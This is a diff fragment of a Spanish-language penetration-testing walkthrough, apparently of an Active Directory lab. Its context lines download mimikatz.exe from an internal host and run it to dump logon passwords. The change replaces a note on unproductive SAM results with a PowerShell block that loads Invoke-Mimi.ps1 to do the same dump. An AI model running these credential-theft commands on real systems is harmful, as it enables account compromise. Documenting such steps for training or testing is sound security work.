@@ -93,7 +93,10 @@ Invoke-WebRequest -Uri http://172.16.99.11:8000/mimikatz.exe -OutFile mimikatz.e
 .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
 ```
 
-(en el informe se indica que la SAM local no dio ninguna credencial útil).
+```PoweShell
+. .\Invoke-Mimi.ps1 
+Invoke-Mimi -Command 'sekurlsa::logonpasswords'
+```
 
 **12. Identificar delegación T2A4D (documentado)**
 
